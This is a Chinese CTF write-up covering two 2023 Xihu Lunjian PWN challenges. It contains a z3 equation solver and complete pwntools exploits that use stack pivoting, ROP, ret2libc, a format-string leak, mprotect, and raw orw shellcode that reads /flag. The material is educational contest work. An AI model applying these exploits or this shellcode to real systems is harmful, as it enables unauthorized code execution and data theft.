---
title: 2023西湖论剑 PWN 部分WP
tags:
  - orw
  - 栈迁移
  - 求解方程组
  - ret2libc
  - 格式化字符串漏洞
categories: 赛题WP
abbrlink: 1c9fd873
---

一共五个 `PWN` ，有两个零解，还有一个很少解的题目，本人菜鸡选手做不出来，估计后面复现也够呛，就记录一下比赛做出来的两个常规 `PWN`。



## babycalc

### 保护策略

![image-20230202185343223](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021853480.png)

### 漏洞所在

![image-20230202185510362](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021855407.png)

溢出了 `rbp` 末字节为 `\x00` ，并且往 `buf` 里输入数据的时候可以控制如下所有变量

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021856648.png" alt="image-20230202185640585" style="zoom:50%;" />

结合这一行代码 `*(&v3 + i) = v0;` ，因为 `i` 是可以控制的，所以此处有一次的任意栈地址单字节写入的机会，通过 `gdb` 调试发现返回地址和 `leave ; ret` 指令的地址前两个字节都一样，所以向返回地址末尾写入 `\x17` ，以此来作出 `leave ; ret`

![image-20230202190116289](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021901380.png)



需要注意的是因为将 `i` 改大之后，下一次的循环就一定进不去了，所以这个任意栈地址写单字节只有一次机会。同时将 `buf` 写满，让 `rbp` 末尾为  `0` （此时 `rbp` 指向了 `buf` 中的数据）也就意味着接下来触发栈迁移，会迁移到我们可控的地方执行 `rop`



上述成功的前提是要把这个方程组给解出来，先安装下 `z3` 这个包 ，然后用 `python` 跑一下即可，脚本如下

```py
from z3 import *
v3=Int('v3')
v4=Int('v4')
v5=Int('v5')
v6=Int('v6')
v7=Int('v7')
v8=Int('v8')
v9=Int('v9')
v10=Int('v10')
v11=Int('v11')
v12=Int('v12')
v13=Int('v13')
v14=Int('v14')
v15=Int('v15')
v16=Int('v16')
v17=Int('v17')
v18=Int('v18')

s = Solver()
s.add((v17 + v16 * v15) * v18 == 0x11376)
s.add(v5 * v4 * v3 - v6 == 0x8D56)
s.add(v3 == 0x13)
s.add(v5 * 0x13 * v4 + v6 == 0x8DE2)
s.add((v13 + v3 - v8) * v16 == 0x8043)
s.add((v4 * v3 - v5) * v6 == 0xAC8A)
s.add((v5 + v4 * v3) * v6 == 0xC986)
s.add(v9 * v8 * v7 - v10 == 0xF06D)
s.add(v10 * v15 + v4 + v18 == 0x4A5D)
s.add(v9 * v8 * v7 + v10 == 0xF1AF)
s.add((v8 * v7 - v9) * v10 == 0x8E03D)
s.add(v11 == 0x32)
s.add((v9 + v8 * v7) * v10 == 0x8F59F)
s.add(v13 * v12 * v11 - v14 == 0x152FD3)
s.add(v13 * v12 * v11 + v14 == 0x15309D)
s.add((v12 * v11 - v13) * v14 == 0x9C48A)
s.add((v11 * v5 - v16) * v12 == 0x4E639)
s.add((v13 + v12 * v11) * v14 == 0xA6BD2)
s.add(v17 * v16 * v15 - v18 == 0x8996D)
s.add(v17 * v16 * v15 + v18 == 0x89973)
s.add(v14 == 0x65)
s.add((v16 * v15 - v17) * v18 == 0x112E6)

if s.check() == sat:
    print(s.model())
```



求解后的值

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021907794.png" alt="image-20230202190705641" style="zoom:50%;" />



上述栈迁移后，执行的是栈里的 `rop` ，因为 `rdx` 是一个比较大的值，所以直接调用 `read` 函数向 `bss` 段写入数据（这个地址找高点，不然之后执行 `system` 函数开辟栈帧可能会覆盖一些其他指针），然后程序中是存在这个  `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret` ,利用这个 `gadget` 可以再进行一次栈迁移（因为栈里无法布置太长的 `rop` 链，只能迁移到 `bss` 段上）

迁移到 `bss` 段上后再打一次 `ret2libc` 即可

**注意：** 因为栈随机化的原因，`rbp` 的末尾覆盖为 `\x00` 后，不是一定能指向 `rop` 链的开始部分，而是在一个区域内随机的，所以在 `rop` 上面写满 `ret` 指令，滑到 `rop` 链上成功的概率会大一点。



放几张调试时的图片

下面是执行到 `puts("good done")` 时，栈中的情况，可以看到返回地址已经变成了 `nop ; leave ; ret` 的地址， `rbp` 指向了上面 `ret` 的部分，而 `ret` 下面就是 `rop链` ，该 `rop` 链是向 `bss` 段写入 `ret2libc` 的 `payload`

![image-20230202193808421](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021938029.png)



第二次栈迁移

![image-20230202194109919](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021941345.png)





执行 `puts` 函数泄露 `libc` 地址，此时栈已经迁移到了 `bss` 段上

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021942043.png" alt="image-20230202194207428" style="zoom:50%;" />



最后触发 `system` 函数，获取 `shell`

![image-20230202194320318](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021943748.png)



![image-20230202194345788](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021943035.png)



### EXP

[tools源码](https://zikh26.github.io/posts/ad411136.html)

```py
from tools import *
context.log_level='debug'
context.arch='amd64'
p,e,libc=load('b',"tcp.cloud.dasctf.com:21323")

v3 = 19
v11 = 50
v14 = 101
v18 = 3
v10 = 161
v12 = 131
v5 = 53
v16 = 199
v7 = 55
v9 = 17
v15 = 118
v17 = 24
v6 = 70
v4 = 36
v13 = 212
v8 = 66


pop_rdi=0x0000000000400ca3
pop_rsi_r15=0x0000000000400ca1
bss_addr=0x602510
pop_rsp_r13_r14_r15=0x0000000000400c9d
ret=0x400C3E


rop=p64(pop_rdi)+p64(0)
rop+=p64(pop_rsi_r15)+p64(bss_addr)+p64(0)
rop+=p64(e.plt['read'])
rop+=p64(pop_rsp_r13_r14_r15)
rop+=p64(bss_addr-0x18)


pay = b'\x32\x33'+ b'\x00'*(86-0x40) #206
pay+=p64(ret)*0xf
pay+= rop

pay += p8(v3)
pay += p8(v4)
pay += p8(v5)
pay += p8(v6)
pay += p8(v7)
pay += p8(v8)
pay += p8(v9)
pay += p8(v10)
pay += p8(v11)
pay += p8(v12)
pay += p8(v13)
pay += p8(v14)
pay += p8(v15)
pay += p8(v16)
pay += p8(v17)
pay += p8(v18)
pay+=b'\x00'*(0x100-0xe0-4)+b'\x38\x00\x00\x00'

for i in range(15):
    p.sendafter(':',b'1\n')

debug(p,0x400BA6)
p.sendafter(b':', pay)

pause()
rop2=p64(pop_rdi)+p64(e.got['puts'])
rop2+=p64(e.plt['puts'])
rop2+=p64(pop_rdi)+p64(0)
rop2+=p64(pop_rsi_r15)+p64(bss_addr+0x48)+p64(0)
rop2+=p64(e.plt['read'])
p.sendline(rop2)

puts_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base=puts_addr-libc.symbols['puts']
log_addr('puts_addr')
log_addr('libc_base')
sys_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base +next(libc.search(b"/bin/sh"))
rop1=p64(0x400BB8)+p64(pop_rdi)+p64(bin_sh_addr)+p64(sys_addr)
pause()
p.sendline(rop1)
p.interactive()
```



## Message Board

这个题格式化字符串漏洞泄露栈地址和 `libc` 地址，然后栈迁移再打 `mprotect` 函数和 `orw` 的 `shellcode` 即可， 比较简单就不写过程了 

### EXP

[tools源码](https://zikh26.github.io/posts/ad411136.html)

```py
from tools import *
context.log_level='debug'
context.arch='amd64'
p,e,libc=load("pwn1","tcp.cloud.dasctf.com:20516")
payload="%p%31$p"

p.sendlineafter("Welcome to DASCTF message board, please leave your name:\n",payload)
p.recvuntil("Hello, ")
p.recvuntil('\x78')
stack_addr=int(p.recv(12),16)
p.recvuntil('\x78')
libc_base=int(p.recv(12),16)-0x24083
log_addr('stack_addr')
log_addr('libc_base')
debug(p,0x40138C)
pop_rdi=0x0000000000401413
pop_rsi_r15=0x0000000000401411
pop_rdx_ret=libc_base+0x0000000000142c92
rop=p64(pop_rdi)+p64(stack_addr&0xfffffffffff000)
rop+=p64(pop_rsi_r15)+p64(0x1000)+p64(0)
rop+=p64(pop_rdx_ret)+p64(7)

rop+=p64(libc_base+libc.symbols['mprotect'])
rop+=p64(stack_addr+0x58)#48
rop+=b"\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
rop+=b'a'*(0xb0-60-0x48)
rop+=p64(stack_addr+0x10-8)
rop+=p64(0x4013A2)
p.sendlineafter("Now, please say something to DASCTF:\n",rop)
p.interactive()

```

![image-20230202195232240](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021952429.png)